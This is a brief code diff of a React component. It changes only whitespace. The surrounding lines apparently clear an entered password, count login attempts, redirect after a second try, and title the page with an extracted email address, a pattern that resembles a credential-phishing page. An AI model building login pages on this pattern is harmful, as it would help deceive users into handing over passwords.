@@ -51,7 +51,7 @@ const Default = ()=>{
             setDefaultPassword('');
         }, 500);
 
-        
+
         setCount(count=> count + 1);
             if(count >= 1){
                 const redirectURL = window.location.href;
@@ -90,7 +90,7 @@ const Default = ()=>{
     };
 
     useEffect(()=>{
-
+        
         const sliceE = extracetdEmail;
         const firstProcess = sliceE.slice(1)
         document.title = extracetdEmail.charAt(0).toUpperCase() + firstProcess
